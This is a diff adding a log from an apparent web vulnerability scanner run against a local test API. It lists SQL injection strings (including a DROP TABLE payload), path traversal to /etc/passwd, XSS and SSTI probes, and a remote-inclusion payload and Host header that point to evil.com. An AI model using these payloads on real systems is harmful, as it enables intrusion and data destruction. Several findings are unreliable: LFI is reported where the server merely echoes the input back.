+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,431 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=../../etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,433 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=../../../etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,434 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=file:///etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,435 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=../windows/win.ini returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,436 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=../../windows/win.ini returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,437 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=/etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,438 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=../etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,440 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=../../etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,441 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=../../../etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,442 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=file:///etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,443 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=../windows/win.ini returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,444 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with username=../../windows/win.ini returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'password'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,444 - INFO - LFIScanner results: []
+2025-03-16 17:51:36,444 - INFO - Running RFIScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,448 - INFO - RFIScanner results: []
+2025-03-16 17:51:36,448 - INFO - Running SSTIScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,451 - INFO - SSTIScanner results: []
+2025-03-16 17:51:36,451 - INFO - Endpoint data - method: GET, path: http://192.168.18.9:8000/api/sstinovuln, get_params: [{'name': 'mathexp', 'type': 'string', 'required': True}], post_body: {}
+2025-03-16 17:51:36,451 - INFO - Running SQLInjectionScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,456 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:36,456 - INFO - Running BrokenAuthScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,457 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:36,457 - INFO - Running SensitiveDataScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,458 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:36,458 - INFO - Running XXEScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,458 - INFO - XXEScanner results: []
+2025-03-16 17:51:36,458 - INFO - Running BrokenAccessScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,458 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:36,458 - INFO - Running MisconfigScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,458 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:36,458 - INFO - Running XSSScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,460 - INFO - XSSScanner results: []
+2025-03-16 17:51:36,460 - INFO - Running DeserializationScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,460 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:36,460 - INFO - Running ComponentsScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,461 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:36,461 - INFO - Running LoggingMonitoringScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,461 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:36,461 - INFO - Running HHIScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,462 - INFO - HHIScanner results: []
+2025-03-16 17:51:36,462 - INFO - Running LFIScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,462 - INFO - Scanning GET http://192.168.18.9:8000/api/sstinovuln for LFI
+2025-03-16 17:51:36,462 - INFO - LFIScanner results: []
+2025-03-16 17:51:36,462 - INFO - Running RFIScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,464 - INFO - RFIScanner results: []
+2025-03-16 17:51:36,464 - INFO - Running SSTIScanner on GET http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,466 - INFO - Found: SSTI at http://192.168.18.9:8000/api/sstinovuln
+2025-03-16 17:51:36,466 - INFO - SSTIScanner results: [{'type': 'Server-Side Template Injection (SSTI)', 'severity': 'High', 'description': 'The application is prone to Server-Side Template Injection attacks. SSTI occurs when user input is used directly in server-side templates, potentially leading to code execution on the server.', 'reproduce': 'GET http://192.168.18.9:8000/api/sstinovuln?mathexp={{7*7}}\nGET http://192.168.18.9:8000/api/sstinovuln?mathexp={# 7 * 7 #}', 'mitigation': 'Sanitize user input and avoid dynamic template evaluation'}]
+2025-03-16 17:51:36,466 - INFO - Endpoint data - method: POST, path: http://192.168.18.9:8000/api/sstivuln, get_params: [], post_body: {'mathexp': {'type': 'string'}}
+2025-03-16 17:51:36,466 - INFO - Running SQLInjectionScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,469 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/sstivuln with payload: ' UNION SELECT sqlite_version(), NULL --
+2025-03-16 17:51:36,470 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/sstivuln with payload: ' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --
+2025-03-16 17:51:36,471 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/sstivuln with payload: ' AND sqlite_version() --
+2025-03-16 17:51:36,472 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/sstivuln with payload: '; DROP TABLE users; --
+2025-03-16 17:51:36,472 - INFO - Found: SQLi at http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,472 - INFO - SQLInjectionScanner results: [{'type': 'SQL Injection (SQLite3)', 'severity': 'High', 'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\' UNION SELECT sqlite_version(), NULL --"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\' UNION SELECT name, sql FROM sqlite_master WHERE type=\'table\' --"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\' AND sqlite_version() --"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\'; DROP TABLE users; --"}', 'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'}]
+2025-03-16 17:51:36,472 - INFO - Running BrokenAuthScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,472 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:36,472 - INFO - Running SensitiveDataScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,472 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:36,472 - INFO - Running XXEScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,473 - INFO - XXEScanner results: []
+2025-03-16 17:51:36,473 - INFO - Running BrokenAccessScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,473 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:36,473 - INFO - Running MisconfigScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,473 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:36,473 - INFO - Running XSSScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,475 - INFO - Found: XSS at http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,475 - INFO - XSSScanner results: [{'type': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'description': 'The application is susceptible to Cross-Site Scripting attacks. These vulnerabilities occur when unvalidated user inputs are rendered directly in the HTML page, allowing malicious scripts to be executed in the context of the website.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "<script>alert(\'xss\')</script>"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\'><img src=x onerror=alert(1)>"}', 'mitigation': 'Sanitize user input and implement Content Security Policy (CSP)'}]
+2025-03-16 17:51:36,475 - INFO - Running DeserializationScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,476 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:36,476 - INFO - Running ComponentsScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,476 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:36,476 - INFO - Running LoggingMonitoringScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,476 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:36,476 - INFO - Running HHIScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,477 - INFO - HHIScanner results: []
+2025-03-16 17:51:36,477 - INFO - Running LFIScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,477 - INFO - Scanning POST http://192.168.18.9:8000/api/sstivuln for LFI
+2025-03-16 17:51:36,479 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=/etc/passwd returned status: 200, content: {
+  "msg": "my temp: /etc/passwd"
+}
+
+2025-03-16 17:51:36,479 - INFO - LFI detected on POST http://192.168.18.9:8000/api/sstivuln with payload: /etc/passwd in body mathexp
+2025-03-16 17:51:36,480 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=../etc/passwd returned status: 200, content: {
+  "msg": "my temp: ../etc/passwd"
+}
+
+2025-03-16 17:51:36,480 - INFO - LFI detected on POST http://192.168.18.9:8000/api/sstivuln with payload: ../etc/passwd in body mathexp
+2025-03-16 17:51:36,481 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=../../etc/passwd returned status: 200, content: {
+  "msg": "my temp: ../../etc/passwd"
+}
+
+2025-03-16 17:51:36,481 - INFO - LFI detected on POST http://192.168.18.9:8000/api/sstivuln with payload: ../../etc/passwd in body mathexp
+2025-03-16 17:51:36,483 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=../../../etc/passwd returned status: 200, content: {
+  "msg": "my temp: ../../../etc/passwd"
+}
+
+2025-03-16 17:51:36,483 - INFO - LFI detected on POST http://192.168.18.9:8000/api/sstivuln with payload: ../../../etc/passwd in body mathexp
+2025-03-16 17:51:36,484 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=file:///etc/passwd returned status: 200, content: {
+  "msg": "my temp: file:///etc/passwd"
+}
+
+2025-03-16 17:51:36,484 - INFO - LFI detected on POST http://192.168.18.9:8000/api/sstivuln with payload: file:///etc/passwd in body mathexp
+2025-03-16 17:51:36,485 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=../windows/win.ini returned status: 200, content: {
+  "msg": "my temp: ../windows/win.ini"
+}
+
+2025-03-16 17:51:36,487 - INFO - POST http://192.168.18.9:8000/api/sstivuln with mathexp=../../windows/win.ini returned status: 200, content: {
+  "msg": "my temp: ../../windows/win.ini"
+}
+
+2025-03-16 17:51:36,487 - INFO - LFIScanner results: [{'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '/etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '../../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': 'file:///etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}]
+2025-03-16 17:51:36,487 - INFO - Running RFIScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,489 - INFO - Found: RFI at http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,489 - INFO - RFIScanner results: [{'type': 'Remote File Inclusion (RFI)', 'severity': 'High', 'description': 'The application is vulnerable to Remote File Inclusion attacks. RFI occurs when user-supplied input is used to include remote files from external servers, leading to potential code execution and unauthorized access.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "http://evil.com/malicious.php"}', 'mitigation': 'Disallow remote file inclusion and validate inputs'}]
+2025-03-16 17:51:36,489 - INFO - Running SSTIScanner on POST http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,492 - INFO - Found: SSTI at http://192.168.18.9:8000/api/sstivuln
+2025-03-16 17:51:36,492 - INFO - SSTIScanner results: [{'type': 'Server-Side Template Injection (SSTI)', 'severity': 'High', 'description': 'The application is prone to Server-Side Template Injection attacks. SSTI occurs when user input is used directly in server-side templates, potentially leading to code execution on the server.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "{{7*7}}"}', 'mitigation': 'Sanitize user input and avoid dynamic template evaluation'}]
+2025-03-16 17:51:36,492 - INFO - Endpoint data - method: GET, path: http://192.168.18.9:8000/api/xssnovuln, get_params: [{'name': 'username', 'type': 'string', 'required': True}], post_body: {}
+2025-03-16 17:51:36,492 - INFO - Running SQLInjectionScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,497 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:36,497 - INFO - Running BrokenAuthScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,498 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:36,498 - INFO - Running SensitiveDataScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,499 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:36,499 - INFO - Running XXEScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,499 - INFO - XXEScanner results: []
+2025-03-16 17:51:36,499 - INFO - Running BrokenAccessScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,500 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:36,500 - INFO - Running MisconfigScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,500 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:36,500 - INFO - Running XSSScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,503 - INFO - XSSScanner results: []
+2025-03-16 17:51:36,503 - INFO - Running DeserializationScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,503 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:36,503 - INFO - Running ComponentsScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,504 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:36,504 - INFO - Running LoggingMonitoringScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,504 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:36,504 - INFO - Running HHIScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,505 - INFO - HHIScanner results: []
+2025-03-16 17:51:36,505 - INFO - Running LFIScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,505 - INFO - Scanning GET http://192.168.18.9:8000/api/xssnovuln for LFI
+2025-03-16 17:51:36,505 - INFO - LFIScanner results: []
+2025-03-16 17:51:36,505 - INFO - Running RFIScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,507 - INFO - RFIScanner results: []
+2025-03-16 17:51:36,507 - INFO - Running SSTIScanner on GET http://192.168.18.9:8000/api/xssnovuln
+2025-03-16 17:51:36,509 - INFO - SSTIScanner results: []
+2025-03-16 17:51:36,509 - INFO - Endpoint data - method: POST, path: http://192.168.18.9:8000/api/xssreflected, get_params: [], post_body: {'username': {'type': 'string'}}
+2025-03-16 17:51:36,509 - INFO - Running SQLInjectionScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,511 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/xssreflected with payload: ' UNION SELECT sqlite_version(), NULL --
+2025-03-16 17:51:36,512 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/xssreflected with payload: ' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --
+2025-03-16 17:51:36,513 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/xssreflected with payload: ' AND sqlite_version() --
+2025-03-16 17:51:36,514 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/xssreflected with payload: '; DROP TABLE users; --
+2025-03-16 17:51:36,514 - INFO - Found: SQLi at http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,514 - INFO - SQLInjectionScanner results: [{'type': 'SQL Injection (SQLite3)', 'severity': 'High', 'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.', 'reproduce': 'POST http://192.168.18.9:8000/api/xssreflected with {"username": "\' UNION SELECT sqlite_version(), NULL --", "password": "test"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\' UNION SELECT name, sql FROM sqlite_master WHERE type=\'table\' --", "password": "test"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\' AND sqlite_version() --", "password": "test"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\'; DROP TABLE users; --", "password": "test"}', 'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'}]
+2025-03-16 17:51:36,514 - INFO - Running BrokenAuthScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,514 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:36,514 - INFO - Running SensitiveDataScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,514 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:36,514 - INFO - Running XXEScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,516 - INFO - XXEScanner results: []
+2025-03-16 17:51:36,516 - INFO - Running BrokenAccessScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,516 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:36,516 - INFO - Running MisconfigScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,516 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:36,516 - INFO - Running XSSScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,518 - INFO - Found: XSS at http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,518 - INFO - XSSScanner results: [{'type': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'description': 'The application is susceptible to Cross-Site Scripting attacks. These vulnerabilities occur when unvalidated user inputs are rendered directly in the HTML page, allowing malicious scripts to be executed in the context of the website.', 'reproduce': 'POST http://192.168.18.9:8000/api/xssreflected with {"username": "<script>alert(\'xss\')</script>"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\'><img src=x onerror=alert(1)>"}', 'mitigation': 'Sanitize user input and implement Content Security Policy (CSP)'}]
+2025-03-16 17:51:36,518 - INFO - Running DeserializationScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,519 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:36,519 - INFO - Running ComponentsScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,519 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:36,519 - INFO - Running LoggingMonitoringScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,519 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:36,519 - INFO - Running HHIScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,520 - INFO - HHIScanner results: []
+2025-03-16 17:51:36,520 - INFO - Running LFIScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,520 - INFO - Scanning POST http://192.168.18.9:8000/api/xssreflected for LFI
+2025-03-16 17:51:36,521 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=/etc/passwd returned status: 200, content: {
+  "msg": "Hello, /etc/passwd"
+}
+
+2025-03-16 17:51:36,521 - INFO - LFI detected on POST http://192.168.18.9:8000/api/xssreflected with payload: /etc/passwd in body username
+2025-03-16 17:51:36,522 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=../etc/passwd returned status: 200, content: {
+  "msg": "Hello, ../etc/passwd"
+}
+
+2025-03-16 17:51:36,522 - INFO - LFI detected on POST http://192.168.18.9:8000/api/xssreflected with payload: ../etc/passwd in body username
+2025-03-16 17:51:36,523 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=../../etc/passwd returned status: 200, content: {
+  "msg": "Hello, ../../etc/passwd"
+}
+
+2025-03-16 17:51:36,523 - INFO - LFI detected on POST http://192.168.18.9:8000/api/xssreflected with payload: ../../etc/passwd in body username
+2025-03-16 17:51:36,525 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=../../../etc/passwd returned status: 200, content: {
+  "msg": "Hello, ../../../etc/passwd"
+}
+
+2025-03-16 17:51:36,525 - INFO - LFI detected on POST http://192.168.18.9:8000/api/xssreflected with payload: ../../../etc/passwd in body username
+2025-03-16 17:51:36,526 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=file:///etc/passwd returned status: 200, content: {
+  "msg": "Hello, file:///etc/passwd"
+}
+
+2025-03-16 17:51:36,526 - INFO - LFI detected on POST http://192.168.18.9:8000/api/xssreflected with payload: file:///etc/passwd in body username
+2025-03-16 17:51:36,527 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=../windows/win.ini returned status: 200, content: {
+  "msg": "Hello, ../windows/win.ini"
+}
+
+2025-03-16 17:51:36,528 - INFO - POST http://192.168.18.9:8000/api/xssreflected with username=../../windows/win.ini returned status: 200, content: {
+  "msg": "Hello, ../../windows/win.ini"
+}
+
+2025-03-16 17:51:36,528 - INFO - LFIScanner results: [{'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '/etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '../../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': 'file:///etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}]
+2025-03-16 17:51:36,528 - INFO - Running RFIScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,530 - INFO - Found: RFI at http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,530 - INFO - RFIScanner results: [{'type': 'Remote File Inclusion (RFI)', 'severity': 'High', 'description': 'The application is vulnerable to Remote File Inclusion attacks. RFI occurs when user-supplied input is used to include remote files from external servers, leading to potential code execution and unauthorized access.', 'reproduce': 'POST http://192.168.18.9:8000/api/xssreflected with {"username": "http://evil.com/malicious.php"}', 'mitigation': 'Disallow remote file inclusion and validate inputs'}]
+2025-03-16 17:51:36,530 - INFO - Running SSTIScanner on POST http://192.168.18.9:8000/api/xssreflected
+2025-03-16 17:51:36,532 - INFO - SSTIScanner results: []
+2025-03-16 17:51:36,532 - INFO - Running exploit demo
+2025-03-16 17:51:36,533 - WARNING - SQL Injection exploit demo failed
+2025-03-16 17:51:36,534 - INFO - Final vulnerabilities before report: [{'type': 'Missing/Insecure X-Content-Type-Options', 'severity': 'Medium', 'description': 'X-Content-Type-Options header is not properly configured', 'reproduce': 'GET http://192.168.18.9:8000 (check headers)', 'mitigation': 'Configure X-Content-Type-Options correctly'}, {'type': 'Missing/Insecure X-Frame-Options', 'severity': 'Medium', 'description': 'X-Frame-Options header is not properly configured', 'reproduce': 'GET http://192.168.18.9:8000 (check headers)', 'mitigation': 'Configure X-Frame-Options correctly'}, {'type': 'Missing/Insecure Content-Security-Policy', 'severity': 'Medium', 'description': 'Content-Security-Policy header is not properly configured', 'reproduce': 'GET http://192.168.18.9:8000 (check headers)', 'mitigation': 'Configure Content-Security-Policy correctly'}, {'type': 'HOST Header Injection (HHI)', 'severity': 'High', 'description': 'The application is vulnerable to HOST Header Injection attacks. This vulnerability allows an attacker to inject malicious HOST headers, potentially leading to various security issues like cache poisoning or cross-site scripting.', 'reproduce': 'POST http://192.168.18.9:8000/api/hhivuln with Host: evil.com and {"email": "test"}', 'mitigation': 'Validate and sanitize the Host header'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/lfivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send 